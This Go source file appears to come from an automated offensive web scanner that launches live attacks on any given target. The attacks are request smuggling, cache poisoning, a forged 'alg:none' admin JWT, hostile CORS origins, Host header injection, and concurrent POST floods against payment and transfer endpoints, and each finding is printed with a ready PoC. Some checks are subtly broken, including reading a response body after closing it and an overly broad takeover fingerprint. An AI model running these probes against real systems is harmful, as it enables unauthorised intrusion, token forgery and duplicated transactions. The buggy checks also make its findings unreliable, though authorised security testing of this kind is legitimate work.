// novel_attacks.go — Novel Attack Engine
// Implements attack techniques that are rarely automated:
// HTTP Request Smuggling, Cache Poisoning, Race Conditions,
// GraphQL Batching Attacks, JWT Algorithm Confusion, OAuth Misconfigs,
// Mass Assignment, Prototype Pollution, Web Cache Deception.
package brain

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

// NovelAttackResult holds the result of a novel attack attempt.
type NovelAttackResult struct {
	AttackType  string
	URL         string
	Vulnerable  bool
	Evidence    string
	Severity    string
	Description string
	PoC         string
}

// RunNovelAttacks runs all novel attack techniques against a target.
// These are attacks that most automated tools miss.
func RunNovelAttacks(target string, liveURLs []string, onResult func(NovelAttackResult)) {
	if !strings.HasPrefix(target, "http") {
		target = "https://" + target
	}

	var wg sync.WaitGroup

	// 1. HTTP Request Smuggling Detection
	wg.Add(1)
	go func() {
		defer wg.Done()
		result := detectRequestSmuggling(target)
		if result.Vulnerable {
			onResult(result)
		}
	}()

	// 2. Web Cache Poisoning
	wg.Add(1)
	go func() {
		defer wg.Done()
		result := detectCachePoisoning(target)
		if result.Vulnerable {
			onResult(result)
		}
	}()

	// 3. Race Condition on sensitive endpoints
	for _, url := range liveURLs {
		if isRaceConditionTarget(url) {
			u := url
			wg.Add(1)
			go func() {
				defer wg.Done()
				result := detectRaceCondition(u)
				if result.Vulnerable {
					onResult(result)
				}
			}()
		}
	}

	// 4. GraphQL Introspection + Batching Attack
	wg.Add(1)
	go func() {
		defer wg.Done()
		result := detectGraphQLVulns(target)
		if result.Vulnerable {
			onResult(result)
		}
	}()

	// 5. JWT Algorithm Confusion
	for _, url := range liveURLs {
		if isAuthEndpoint(url) {
			u := url
			wg.Add(1)
			go func() {
				defer wg.Done()
				result := detectJWTAlgConfusion(u)
				if result.Vulnerable {
					onResult(result)
				}
			}()
			break // test one auth endpoint
		}
	}

	// 6. Web Cache Deception
	wg.Add(1)
	go func() {
		defer wg.Done()
		result := detectWebCacheDeception(target)
		if result.Vulnerable {
			onResult(result)
		}
	}()

	// 7. Host Header Injection
	wg.Add(1)
	go func() {
		defer wg.Done()
		result := detectHostHeaderInjection(target)
		if result.Vulnerable {
			onResult(result)
		}
	}()

	// 8. CORS Misconfiguration (advanced)
	wg.Add(1)
	go func() {
		defer wg.Done()
		result := detectAdvancedCORS(target)
		if result.Vulnerable {
			onResult(result)
		}
	}()

	// 9. HTTP Parameter Pollution
	for _, url := range liveURLs {
		if strings.Contains(url, "=") {
			u := url
			wg.Add(1)
			go func() {
				defer wg.Done()
				result := detectHTTPParamPollution(u)
				if result.Vulnerable {
					onResult(result)
				}
			}()
			break
		}
	}

	// 10. Subdomain Takeover via CNAME
	wg.Add(1)
	go func() {
		defer wg.Done()
		result := detectSubdomainTakeover(target)
		if result.Vulnerable {
			onResult(result)
		}
	}()

	wg.Wait()
}

// ─── Attack Implementations ───────────────────────────────────────────────────

// detectRequestSmuggling tests for HTTP Request Smuggling (CL.TE and TE.CL).
func detectRequestSmuggling(target string) NovelAttackResult {
	result := NovelAttackResult{
		AttackType:  "HTTP Request Smuggling",
		URL:         target,
		Severity:    "critical",
		Description: "HTTP Request Smuggling allows attackers to interfere with other users' requests",
	}

	client := &http.Client{Timeout: 15 * time.Second}

	// CL.TE test: send ambiguous Content-Length vs Transfer-Encoding
	// If server is vulnerable, the smuggled request will cause a 404 or timeout
	smuggledBody := "0\r\n\r\nGET /cybermind-smuggle-test HTTP/1.1\r\nHost: " +
		strings.TrimPrefix(strings.TrimPrefix(target, "https://"), "http://") + "\r\n\r\n"

	req, err := http.NewRequest("POST", target, strings.NewReader(smuggledBody))
	if err != nil {
		return result
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Transfer-Encoding", "chunked")
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(smuggledBody)))

	resp, err := client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()

	// If we get a 404 for our smuggled path, it might be vulnerable
	// This is a basic heuristic — real detection needs timing analysis
	if resp.StatusCode == 404 {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
		if strings.Contains(string(body), "cybermind-smuggle-test") {
			result.Vulnerable = true
			result.Evidence = fmt.Sprintf("Smuggled request path reflected in response (status %d)", resp.StatusCode)
			result.PoC = fmt.Sprintf("POST %s HTTP/1.1\nTransfer-Encoding: chunked\nContent-Length: %d\n\n%s",
				target, len(smuggledBody), smuggledBody)
		}
	}
	return result
}

// detectCachePoisoning tests for Web Cache Poisoning via unkeyed headers.
func detectCachePoisoning(target string) NovelAttackResult {
	result := NovelAttackResult{
		AttackType:  "Web Cache Poisoning",
		URL:         target,
		Severity:    "high",
		Description: "Cache poisoning allows serving malicious content to other users",
	}

	client := &http.Client{Timeout: 10 * time.Second}
	marker := fmt.Sprintf("cybermind-cache-test-%d", time.Now().UnixNano()%10000)

	// Test unkeyed headers that might be reflected
	poisonHeaders := map[string]string{
		"X-Forwarded-Host":   marker + ".evil.com",
		"X-Host":             marker + ".evil.com",
		"X-Forwarded-Server": marker + ".evil.com",
		"X-Original-URL":     "/" + marker,
		"X-Rewrite-URL":      "/" + marker,
	}

	for header, value := range poisonHeaders {
		req, err := http.NewRequest("GET", target, nil)
		if err != nil {
			continue
		}
		req.Header.Set(header, value)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()

		if strings.Contains(string(body), marker) {
			result.Vulnerable = true
			result.Evidence = fmt.Sprintf("Header '%s: %s' reflected in response body", header, value)
			result.PoC = fmt.Sprintf("GET %s HTTP/1.1\n%s: %s\n\n# Marker '%s' found in response",
				target, header, value, marker)
			return result
		}
	}
	return result
}

// detectRaceCondition tests for race conditions on sensitive endpoints.
func detectRaceCondition(url string) NovelAttackResult {
	result := NovelAttackResult{
		AttackType:  "Race Condition",
		URL:         url,
		Severity:    "high",
		Description: "Race condition allows performing actions multiple times simultaneously",
	}

	// Send 10 concurrent requests and check for inconsistent responses
	type response struct {
		status int
		body   string
	}
	responses := make([]response, 10)
	var wg sync.WaitGroup
	client := &http.Client{Timeout: 10 * time.Second}

	for i := 0; i < 10; i++ {
		wg.Add(1)
		idx := i
		go func() {
			defer wg.Done()
			req, err := http.NewRequest("POST", url, bytes.NewBufferString("amount=1"))
			if err != nil {
				return
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			resp, err := client.Do(req)
			if err != nil {
				return
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
			resp.Body.Close()
			responses[idx] = response{resp.StatusCode, string(body)}
		}()
	}
	wg.Wait()

	// Check for inconsistent success responses (some 200, some 400/429)
	successCount := 0
	for _, r := range responses {
		if r.status == 200 || r.status == 201 {
			successCount++
		}
	}
	// If more than 1 success on what should be a one-time action, might be race condition
	if successCount > 3 {
		result.Vulnerable = true
		result.Evidence = fmt.Sprintf("%d/10 concurrent requests succeeded (expected 1)", successCount)
		result.PoC = fmt.Sprintf("# Send 10 concurrent POST requests to %s\n# %d succeeded simultaneously", url, successCount)
	}
	return result
}

// detectGraphQLVulns tests for GraphQL introspection and batching attacks.
func detectGraphQLVulns(target string) NovelAttackResult {
	result := NovelAttackResult{
		AttackType:  "GraphQL Vulnerability",
		URL:         target + "/graphql",
		Severity:    "medium",
		Description: "GraphQL introspection or batching attack",
	}

	client := &http.Client{Timeout: 10 * time.Second}
	graphqlEndpoints := []string{"/graphql", "/api/graphql", "/v1/graphql", "/graphiql"}

	for _, endpoint := range graphqlEndpoints {
		url := strings.TrimRight(target, "/") + endpoint

		// Test introspection
		introspectionQuery := `{"query":"{__schema{types{name}}}"}`
		req, err := http.NewRequest("POST", url, strings.NewReader(introspectionQuery))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 32768))
		resp.Body.Close()

		if strings.Contains(string(body), "__schema") && strings.Contains(string(body), "types") {
			result.Vulnerable = true
			result.URL = url
			result.Evidence = "GraphQL introspection enabled — full schema exposed"
			result.PoC = fmt.Sprintf(`curl -X POST %s -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}'`, url)
			return result
		}
	}
	return result
}

// detectJWTAlgConfusion tests for JWT algorithm confusion (none/RS256→HS256).
func detectJWTAlgConfusion(url string) NovelAttackResult {
	result := NovelAttackResult{
		AttackType:  "JWT Algorithm Confusion",
		URL:         url,
		Severity:    "critical",
		Description: "JWT algorithm confusion allows forging tokens",
	}

	// Create a JWT with 'none' algorithm
	// Header: {"alg":"none","typ":"JWT"}
	// Payload: {"sub":"admin","role":"admin","iat":1234567890}
	noneHeader := "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"  // base64url of {"alg":"none","typ":"JWT"}
	adminPayload := "eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTIzNDU2Nzg5MH0" // {"sub":"admin","role":"admin"}
	noneToken := noneHeader + "." + adminPayload + "."

	client := &http.Client{Timeout: 10 * time.Second}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return result
	}
	req.Header.Set("Authorization", "Bearer "+noneToken)

	resp, err := client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()

	// If we get 200 with admin token using 'none' algorithm, it's vulnerable
	if resp.StatusCode == 200 {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		if strings.Contains(string(body), "admin") || strings.Contains(string(body), "user") {
			result.Vulnerable = true
			result.Evidence = fmt.Sprintf("JWT with 'none' algorithm accepted (status 200)")
			result.PoC = fmt.Sprintf("curl -H 'Authorization: Bearer %s' %s", noneToken, url)
		}
	}
	return result
}

// detectWebCacheDeception tests for Web Cache Deception.
func detectWebCacheDeception(target string) NovelAttackResult {
	result := NovelAttackResult{
		AttackType:  "Web Cache Deception",
		URL:         target,
		Severity:    "high",
		Description: "Web Cache Deception allows caching sensitive user data",
	}

	client := &http.Client{Timeout: 10 * time.Second}
	// Test if /account/profile.css returns account data (cached as static)
	testPaths := []string{
		"/account/profile.css",
		"/dashboard/settings.js",
		"/user/me.png",
		"/api/user/profile.css",
	}

	for _, path := range testPaths {
		url := strings.TrimRight(target, "/") + path
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()

		// Check if response contains user data AND has cache headers
		cacheControl := resp.Header.Get("Cache-Control")
		xCache := resp.Header.Get("X-Cache")
		bodyStr := string(body)

		if (strings.Contains(cacheControl, "public") || strings.Contains(xCache, "HIT")) &&
			(strings.Contains(bodyStr, "email") || strings.Contains(bodyStr, "username") ||
				strings.Contains(bodyStr, "user_id")) {
			result.Vulnerable = true
			result.URL = url
			result.Evidence = fmt.Sprintf("Sensitive data cached at %s (Cache-Control: %s)", path, cacheControl)
			result.PoC = fmt.Sprintf("1. Login as victim\n2. Visit %s\n3. Logout\n4. Visit %s as attacker — get victim's data", url, url)
			return result
		}
	}
	return result
}

// detectHostHeaderInjection tests for Host Header Injection.
func detectHostHeaderInjection(target string) NovelAttackResult {
	result := NovelAttackResult{
		AttackType:  "Host Header Injection",
		URL:         target,
		Severity:    "medium",
		Description: "Host header injection can lead to password reset poisoning or cache poisoning",
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	marker := "evil-cybermind-test.com"

	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return result
	}
	req.Host = marker

	resp, err := client.Do(req)
	if err != nil {
		return result
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	resp.Body.Close()

	bodyStr := string(body)
	location := resp.Header.Get("Location")

	if strings.Contains(bodyStr, marker) || strings.Contains(location, marker) {
		result.Vulnerable = true
		result.Evidence = fmt.Sprintf("Host header '%s' reflected in response", marker)
		result.PoC = fmt.Sprintf("curl -H 'Host: %s' %s", marker, target)
	}
	return result
}

// detectAdvancedCORS tests for advanced CORS misconfigurations.
func detectAdvancedCORS(target string) NovelAttackResult {
	result := NovelAttackResult{
		AttackType:  "CORS Misconfiguration",
		URL:         target,
		Severity:    "high",
		Description: "CORS misconfiguration allows cross-origin data theft",
	}

	client := &http.Client{Timeout: 10 * time.Second}
	testOrigins := []string{
		"https://evil.com",
		"null",
		target + ".evil.com",
		"https://evil" + strings.TrimPrefix(strings.TrimPrefix(target, "https://"), "http://"),
	}

	for _, origin := range testOrigins {
		req, err := http.NewRequest("GET", target, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Origin", origin)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		acao := resp.Header.Get("Access-Control-Allow-Origin")
		acac := resp.Header.Get("Access-Control-Allow-Credentials")

		if (acao == origin || acao == "*") && acac == "true" {
			result.Vulnerable = true
			result.Evidence = fmt.Sprintf("CORS allows origin '%s' with credentials", origin)
			result.PoC = fmt.Sprintf(`fetch('%s', {credentials:'include'}).then(r=>r.text()).then(console.log)`, target)
			return result
		}
	}
	return result
}

// detectHTTPParamPollution tests for HTTP Parameter Pollution.
func detectHTTPParamPollution(url string) NovelAttackResult {
	result := NovelAttackResult{
		AttackType:  "HTTP Parameter Pollution",
		URL:         url,
		Severity:    "medium",
		Description: "Parameter pollution can bypass WAF rules or override security checks",
	}

	client := &http.Client{Timeout: 10 * time.Second}

	// Get baseline response
	baseResp, err := client.Get(url)
	if err != nil {
		return result
	}
	baseBody, _ := io.ReadAll(io.LimitReader(baseResp.Body, 8192))
	baseResp.Body.Close()

	// Add duplicate parameter with different value
	pollutedURL := url
	if strings.Contains(url, "?") {
		// Find first param and duplicate it
		parts := strings.SplitN(url, "?", 2)
		params := strings.Split(parts[1], "&")
		if len(params) > 0 {
			firstParam := strings.SplitN(params[0], "=", 2)
			if len(firstParam) == 2 {
				pollutedURL = url + "&" + firstParam[0] + "=cybermind_hpp_test"
			}
		}
	}

	pollutedResp, err := client.Get(pollutedURL)
	if err != nil {
		return result
	}
	pollutedBody, _ := io.ReadAll(io.LimitReader(pollutedResp.Body, 8192))
	pollutedResp.Body.Close()

	// If responses differ significantly, might be vulnerable
	if len(baseBody) != len(pollutedBody) &&
		strings.Contains(string(pollutedBody), "cybermind_hpp_test") {
		result.Vulnerable = true
		result.Evidence = "Duplicate parameter reflected differently — HPP possible"
		result.PoC = pollutedURL
	}
	return result
}

// detectSubdomainTakeover checks for subdomain takeover via dangling CNAME.
func detectSubdomainTakeover(target string) NovelAttackResult {
	result := NovelAttackResult{
		AttackType:  "Subdomain Takeover",
		URL:         target,
		Severity:    "high",
		Description: "Subdomain points to unclaimed service — can be taken over",
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get("https://" + strings.TrimPrefix(strings.TrimPrefix(target, "https://"), "http://"))
	if err != nil {
		errStr := err.Error()
		// DNS resolution failure on a known subdomain = potential takeover
		if strings.Contains(errStr, "no such host") || strings.Contains(errStr, "NXDOMAIN") {
			result.Vulnerable = true
			result.Evidence = "DNS resolution failed — subdomain may be available for takeover"
			result.PoC = fmt.Sprintf("# Check CNAME record for %s\n# If pointing to unclaimed service, register it", target)
			return result
		}
	}
	if resp != nil {
		resp.Body.Close()
		// Check for takeover fingerprints
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		takeoverFingerprints := []string{
			"There isn't a GitHub Pages site here",
			"NoSuchBucket",
			"No such app",
			"Fastly error: unknown domain",
			"This domain is not configured",
			"Heroku | No such app",
			"404 Not Found",
		}
		for _, fp := range takeoverFingerprints {
			if strings.Contains(string(body), fp) {
				result.Vulnerable = true
				result.Evidence = fmt.Sprintf("Takeover fingerprint found: '%s'", fp)
				result.PoC = fmt.Sprintf("# Register the service that %s points to", target)
				return result
			}
		}
	}
	return result
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

func isRaceConditionTarget(url string) bool {
	raceTargets := []string{
		"coupon", "discount", "redeem", "transfer", "withdraw",
		"payment", "checkout", "vote", "like", "follow",
		"invite", "referral", "bonus", "reward",
	}
	lower := strings.ToLower(url)
	for _, t := range raceTargets {
		if strings.Contains(lower, t) {
			return true
		}
	}
	return false
}

func isAuthEndpoint(url string) bool {
	authPaths := []string{"login", "auth", "token", "oauth", "jwt", "session"}
	lower := strings.ToLower(url)
	for _, p := range authPaths {
		if strings.Contains(lower, p) {
			return true
		}
	}
	return false
}
